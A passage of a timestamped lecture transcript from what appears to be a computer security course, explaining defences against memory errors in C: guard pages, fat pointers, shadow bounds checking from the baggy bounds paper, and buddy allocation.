              <time_slice>1:00:16</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:16</time_slice>
              <text_slice>PROFESSOR: Yeah thank
you for-- yeah exactly.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:18</time_slice>
              <text_slice>So imagine like for
each malloc you do,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:20</time_slice>
              <text_slice>you can have one of these--
and set the guard page for it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:22</time_slice>
              <text_slice>AUDIENCE: And you do
it for log and above?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:25</time_slice>
              <text_slice>Or just above?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:25</time_slice>
              <text_slice>PROFESSOR: You can do either.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:27</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:30</time_slice>
              <text_slice>PROFESSOR: That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:31</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:31</time_slice>
              <text_slice>PROFESSOR: That's right,
well you could do either.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:33</time_slice>
              <text_slice>The ones we have
depending on this--</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:34</time_slice>
              <text_slice>on the size of the object.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:37</time_slice>
              <text_slice>I mean now you got to declare
two guard fences, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>So now this quickly
gets out of control.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:42</time_slice>
              <text_slice>Which yeah, you could have
a booking [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:46</time_slice>
              <text_slice>So that's the basic
idea behind that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:58</time_slice>
              <text_slice>And then another
approach you can look at</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:02</time_slice>
              <text_slice>is what they call fat pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:11</time_slice>
              <text_slice>And so the idea
here is we actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:13</time_slice>
              <text_slice>want to modify the pointer
representation itself</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:16</time_slice>
              <text_slice>to include bounds
information in it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:18</time_slice>
              <text_slice>So if you look at your regular
32-bit pointer what's it</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:27</time_slice>
              <text_slice>look like?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:28</time_slice>
              <text_slice>Well the answer is, 32-bits.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:30</time_slice>
              <text_slice>And then you got [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:32</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:33</time_slice>
              <text_slice>If you look at a
fat pointer then one</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:41</time_slice>
              <text_slice>way you can think
about looking at this</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:42</time_slice>
              <text_slice>is you got a 4 byte base.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:50</time_slice>
              <text_slice>And then you have a 4 byte end.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:57</time_slice>
              <text_slice>So in other words, this is
where it would allocate out</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:59</time_slice>
              <text_slice>that it starts,
that's where it ends</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:02</time_slice>
              <text_slice>and then you've got
a 4 byte cur address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:12</time_slice>
              <text_slice>So this is where
the pointer actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:14</time_slice>
              <text_slice>is, within that bounds, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:16</time_slice>
              <text_slice>So basically what happens is
that the compiler will generate</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:20</time_slice>
              <text_slice>code, such that when you access
these fat pointers this gets</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:24</time_slice>
              <text_slice>updated, but then it'll
also check these two things</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:26</time_slice>
              <text_slice>to make sure that
nothing bad has</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:28</time_slice>
              <text_slice>happened during that upgrade.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:30</time_slice>
              <text_slice>So for example you can imagine
that if I had code like this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:42</time_slice>
              <text_slice>So I have an end pointer
and then I allocate 8 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:47</time_slice>
              <text_slice>So assuming that we're
on a 32-bit architecture</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:49</time_slice>
              <text_slice>to point to 2 [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:53</time_slice>
              <text_slice>And then I have some
while loop that it</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:59</time_slice>
              <text_slice>is going to just assign some
value to the pointer and then</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:05</time_slice>
              <text_slice>increment the pointer--
what you'll see</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:11</time_slice>
              <text_slice>is that the current
address for this pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:13</time_slice>
              <text_slice>like at this point in code,
will point to the base, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:18</time_slice>
              <text_slice>And then every time we
iterate through here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:21</time_slice>
              <text_slice>we can see that we're
either checking a bound,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:24</time_slice>
              <text_slice>or incrementing a bound.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:26</time_slice>
              <text_slice>So at this point we
want to dereference it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:29</time_slice>
              <text_slice>We can actually check and
see, is the current address</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:32</time_slice>
              <text_slice>at that pointer, in this ring.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:34</time_slice>
              <text_slice>And if it's not you
throw in an exception</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:36</time_slice>
              <text_slice>here and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:39</time_slice>
              <text_slice>So once again, where
is this taking place?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:41</time_slice>
              <text_slice>This Is taking place in new code
that the compiler generated.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:45</time_slice>
              <text_slice>So one question that came up
on the online discussion group,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:48</time_slice>
              <text_slice>some people were
saying, well what</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:49</time_slice>
              <text_slice>if it's instrumented code,
what does that mean, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:52</time_slice>
              <text_slice>So when I say that the--
that the compiler generates</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:54</time_slice>
              <text_slice>new code, imagine
that there-- this is</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:56</time_slice>
              <text_slice>what you see as a programmer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:58</time_slice>
              <text_slice>But before this operation
actually takes place,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:02</time_slice>
              <text_slice>imagine the compiler
inserted some new C code here</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:05</time_slice>
              <text_slice>that basically looks at
these base bounds here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:07</time_slice>
              <text_slice>And then if there was
something out of bounds</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:09</time_slice>
              <text_slice>it would then do an exit, or an
abort, or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:12</time_slice>
              <text_slice>So that's what it
means to say that there</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>is instrumented code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:15</time_slice>
              <text_slice>It's that you take the source
code, use the program of C,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:17</time_slice>
              <text_slice>add some new C source
code and then compile</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:20</time_slice>
              <text_slice>that video program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:22</time_slice>
              <text_slice>So the basic idea I think
behind the fat pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:24</time_slice>
              <text_slice>is pretty simple.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:26</time_slice>
              <text_slice>There's some
disadvantages to this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:29</time_slice>
              <text_slice>The biggest
disadvantage is that, oh</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:32</time_slice>
              <text_slice>my goodness look how big
the pointers are now, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:34</time_slice>
              <text_slice>And so what this means
is that you can't just</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:37</time_slice>
              <text_slice>take a fat pointer and
pass it to an unmodified,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:40</time_slice>
              <text_slice>off the shell library.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:41</time_slice>
              <text_slice>Because it may have
certain expectations</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:43</time_slice>
              <text_slice>that pointers are a certain
size and we give you this thing,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:46</time_slice>
              <text_slice>it's just going to--
it's going to blow up.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:48</time_slice>
              <text_slice>We also have trouble
if you want to include</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:50</time_slice>
              <text_slice>these types of pointers and
structs, or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:52</time_slice>
              <text_slice>Because that can actually change
the size of the struct, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:56</time_slice>
              <text_slice>So a very popular
thing in C code to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>is to take like the
size of the struct</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:00</time_slice>
              <text_slice>and then like do something
as a result of that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:01</time_slice>
              <text_slice>Like reserve some disc space
for a struct of that size,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:04</time_slice>
              <text_slice>and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:05</time_slice>
              <text_slice>So this causes all that
stuff to blow up, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:07</time_slice>
              <text_slice>Because once again, the pointers
have gotten very, very big.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:11</time_slice>
              <text_slice>And another thing
which is a bit subtle,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:13</time_slice>
              <text_slice>but it's that these
fat pointers typically</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:17</time_slice>
              <text_slice>will not be able to be updated
in an atomic fashion, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:21</time_slice>
              <text_slice>So on 32-bit
architectures typically,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:24</time_slice>
              <text_slice>if you do like a write
to a 32-bit variable,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:27</time_slice>
              <text_slice>that write is atomic, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:29</time_slice>
              <text_slice>But now, these pointers are
these three integer sized</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:33</time_slice>
              <text_slice>things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:34</time_slice>
              <text_slice>So if you have any code that
takes advantage of the fact</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:37</time_slice>
              <text_slice>that it expects pointer
writes to be atomic,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:39</time_slice>
              <text_slice>then you may get
in trouble, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:41</time_slice>
              <text_slice>Because you can imagine that
to do some of these checks,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:45</time_slice>
              <text_slice>you have to look at the current
address and then look at this</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:48</time_slice>
              <text_slice>and then you might
have to increment</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:49</time_slice>
              <text_slice>that, and so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:51</time_slice>
              <text_slice>So this can cause very
subtle concurrency bugs</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:53</time_slice>
              <text_slice>if you have code that depends
on that atomacy of fail</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:55</time_slice>
              <text_slice>[INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:58</time_slice>
              <text_slice>So does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:59</time_slice>
              <text_slice>So that's one
approach you can do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:01</time_slice>
              <text_slice>But kind of like
electric fences, this</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:05</time_slice>
              <text_slice>has some nasty side effects
that means the people don't</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:09</time_slice>
              <text_slice>typically use that in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:14</time_slice>
              <text_slice>So now we can start talking
about bounds checking,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:19</time_slice>
              <text_slice>with respect to the shadow
of the infrastructure</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:22</time_slice>
              <text_slice>that I mentioned in
the baggy bounds paper.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>So the basic idea for
the shadow base structure</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:37</time_slice>
              <text_slice>is for each object
that you allocate,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:43</time_slice>
              <text_slice>you want to store how
big the object is.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:53</time_slice>
              <text_slice>Right, so for example,
if you have some pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:58</time_slice>
              <text_slice>that you call
malloc on right, you</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:03</time_slice>
              <text_slice>need to store that size
of that object there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:07</time_slice>
              <text_slice>and then note that if you
have some thing that's</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:09</time_slice>
              <text_slice>like a static variable
like this, right,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:15</time_slice>
              <text_slice>the compiler can
automatically figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:18</time_slice>
              <text_slice>what the bounds
are for that thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:19</time_slice>
              <text_slice>there, statically speaking.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:21</time_slice>
              <text_slice>So for each one
of these pointers</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:23</time_slice>
              <text_slice>you need to interpose
somehow on two operations.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:34</time_slice>
              <text_slice>Basically you do arithmetic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:41</time_slice>
              <text_slice>So this is things like q
equals p plus 7, or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:49</time_slice>
              <text_slice>And then you want to
interpose on dereferencing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:55</time_slice>
              <text_slice>So this is something
like q equals</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:02</time_slice>
              <text_slice>a or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:06</time_slice>
              <text_slice>So what's interesting
is that you might think,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:09</time_slice>
              <text_slice>well why can't we just
rely on the reference</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:13</time_slice>
              <text_slice>when interposing stuff?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:16</time_slice>
              <text_slice>Why do we have to look at
this point arithmetic here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:20</time_slice>
              <text_slice>But similarly you might
wonder the other thing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:22</time_slice>
              <text_slice>Like why can't you
just deal with one</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:23</time_slice>
              <text_slice>of these non [INAUDIBLE]
interpose [INAUDIBLE]?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:26</time_slice>
              <text_slice>So you can't just
signal an error</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:29</time_slice>
              <text_slice>if you see the arithmetic going
out of bounds because in c</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:34</time_slice>
              <text_slice>that may or may not be there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:37</time_slice>
              <text_slice>So in other words, a very common
medium is C and C++ is you</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>might have a pointer that
points to one pass the valid end</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:44</time_slice>
              <text_slice>of an object right, and then you
use that as a stop condition,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:47</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:48</time_slice>
              <text_slice>So you iterate to the
object and once you</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:49</time_slice>
              <text_slice>hit that end pointer, that's
when you actually stop the loop</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:52</time_slice>
              <text_slice>or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:54</time_slice>
              <text_slice>So if we just
interpose on arithmetic</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:56</time_slice>
              <text_slice>and we always
cause a hard fault,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:58</time_slice>
              <text_slice>when we see a pointer
go out of bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:00</time_slice>
              <text_slice>that may actually break a lot of
legitimate applications, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:04</time_slice>
              <text_slice>So we can't just
interpose on that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:06</time_slice>
              <text_slice>And so you might say, well
why can't you just interpose</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:09</time_slice>
              <text_slice>on the reference thing, and
you just-- when we notice</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:12</time_slice>
              <text_slice>that you've cut
something out of bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:14</time_slice>
              <text_slice>we'll just read there and there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:15</time_slice>
              <text_slice>Well the challenge
there is that how do</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:17</time_slice>
              <text_slice>you know it's out of bounds?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:18</time_slice>
              <text_slice>Right, it's the-- it's the
arithmetic in our positioning</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:21</time_slice>
              <text_slice>that officially allows
us to tell whether or not</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:24</time_slice>
              <text_slice>this thing's going to
be legal here, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:25</time_slice>
              <text_slice>Because it's the
interpositioning</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:27</time_slice>
              <text_slice>on the arithmetic that
allows us to track</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:29</time_slice>
              <text_slice>where the pointer
is with respect</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:31</time_slice>
              <text_slice>to it's original baseline.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:34</time_slice>
              <text_slice>So that's the basic idea there.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:41</time_slice>
              <text_slice>And so the next question
is how do we actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:45</time_slice>
              <text_slice>implement the bounds checking?</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:49</time_slice>
              <text_slice>Because basically we need some
way to map a particular pointer</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:55</time_slice>
              <text_slice>address to some type of bounds
information for that pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:00</time_slice>
              <text_slice>And so a lot of your
previous solutions</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:02</time_slice>
              <text_slice>use things like, for example,
like a hash table, or a tree,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:05</time_slice>
              <text_slice>right that will allow
you to do lookups right,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:07</time_slice>
              <text_slice>and stay the gray.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:08</time_slice>
              <text_slice>So given a pointer
address, I do some lookup</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:11</time_slice>
              <text_slice>in this data structure, figure
out what the bounds are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:14</time_slice>
              <text_slice>Given those bounds I
can then figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:16</time_slice>
              <text_slice>if I want to allow the
action to take place or not.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:18</time_slice>
              <text_slice>Now the problem with that
is that it's a slow lookup,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:21</time_slice>
              <text_slice>right because these data
structures you're thinking it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:24</time_slice>
              <text_slice>a tree, or you're going
through a bunch of branches</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:26</time_slice>
              <text_slice>before you can actually
hit the value potentially.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:29</time_slice>
              <text_slice>And even if it's a hash
table where there's</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:31</time_slice>
              <text_slice>an overflow in the bucket
you got to follow chains,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:33</time_slice>
              <text_slice>or do you're code,
or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:36</time_slice>
              <text_slice>So the baggy bounds
paper that we</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:40</time_slice>
              <text_slice>are about to look at
actually figured out</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:42</time_slice>
              <text_slice>a very efficient data structure
that tracked to these bounds,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:45</time_slice>
              <text_slice>to make that bound
checking very fat.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:49</time_slice>
              <text_slice>So let's just step
into that right now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:51</time_slice>
              <text_slice>But before we go into
that let me very briefly</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:53</time_slice>
              <text_slice>talk about how buddy
allocation works.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:55</time_slice>
              <text_slice>Because that's one of
the things that came up</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:56</time_slice>
              <text_slice>in a lot of the questions.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:58</time_slice>
              <text_slice>So one thing you will see for
these papers is that a lot</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:00</time_slice>
              <text_slice>of times they are not
self-contained, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:02</time_slice>
              <text_slice>So they will mention things that
they will assume that you know,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:05</time_slice>
              <text_slice>but you may not know them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:07</time_slice>
              <text_slice>Don't get discouraged by that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:08</time_slice>
              <text_slice>That happens to
me too sometimes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:10</time_slice>
              <text_slice>These papers are
written in a way</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:11</time_slice>
              <text_slice>they assume a lot
of prior knowledge,</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:12</time_slice>
              <text_slice>so don't get
discouraged by that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:14</time_slice>
              <text_slice>Luckily we actually
access to the internet</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:16</time_slice>
              <text_slice>we can look up
some of that stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:17</time_slice>
              <text_slice>Can you imagine what
happened in our parents time?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:18</time_slice>
              <text_slice>They just didn't
understand stuff they just</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:19</time_slice>
              <text_slice>had to go home, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:21</time_slice>
              <text_slice>So don't be afraid to look
stuff up to get to Wikipedia</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:25</time_slice>
              <text_slice>it's mostly correct.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:30</time_slice>
              <text_slice>So how does-- how does the
buddy allocation system work?</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:37</time_slice>
              <text_slice>So basically what
it does at first</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:40</time_slice>
              <text_slice>it treats unallocated
memory as one big block.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:44</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:44</time_slice>
              <text_slice>And then when you
request a smaller block</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:47</time_slice>
              <text_slice>for dynamic allocation, it
tries to split that address</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:51</time_slice>
              <text_slice>base using powers of 2
until it finds a block that</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:56</time_slice>
              <text_slice>is just big enough to work.</text_slice>
            </slice>
            <slice>
              <time_slice>1:11:57</time_slice>
              <text_slice>So let's say a request
came in and say A</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:00</time_slice>
              <text_slice>is going to equal to malloc 28.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:06</time_slice>
              <text_slice>28 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:07</time_slice>
              <text_slice>And let's just say
this toy example is</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:09</time_slice>
              <text_slice>only 128 bytes of memory total.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:11</time_slice>
              <text_slice>So the buddy allocator
is going to look at this</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:13</time_slice>
              <text_slice>and say, well I have
128 bytes of memory,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:14</time_slice>
              <text_slice>but it's too wasteful to
allocate this whole thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:17</time_slice>
              <text_slice>to this 28 byte request.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:18</time_slice>
              <text_slice>So I'm going to split
this request in two</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:20</time_slice>
              <text_slice>and then see if I have smaller
block that's just big enough.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:24</time_slice>
              <text_slice>So it's going to say, OK put
this to 0 to 64 and 64 to 128.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:29</time_slice>
              <text_slice>Ah OK, but this block here
is still too big, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:31</time_slice>
              <text_slice>Basically what the buddy
algorithm wants to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:33</time_slice>
              <text_slice>is find a block such
that the allocated</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:36</time_slice>
              <text_slice>data in the real
object, 28 bytes,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:38</time_slice>
              <text_slice>is at least half the
size of that block.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:42</time_slice>
              <text_slice>So buddy allocator says,
OK this thing over here</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:44</time_slice>
              <text_slice>is still too big.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:45</time_slice>
              <text_slice>So what it's going to do is
it's going to split the memory</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:47</time_slice>
              <text_slice>space again, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:51</time_slice>
              <text_slice>So from 0 to 32 and
then it's going to say,</text_slice>
            </slice>
            <slice>
              <time_slice>1:12:58</time_slice>
              <text_slice>ah OK 28 bytes that is more
than half the size of this block</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:02</time_slice>
              <text_slice>here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:02</time_slice>
              <text_slice>So now this block is going
to be allocated to A. OK,</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:08</time_slice>
              <text_slice>and so it gets
this address here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:10</time_slice>
              <text_slice>Now let's say that we have
another question comes in for B</text_slice>
            </slice>
            <slice>
              <time_slice>1:13:17</time_slice>
              <text_slice>and let's say we want
to malloc 50 right.</text_slice>
            </slice>
            <slice>
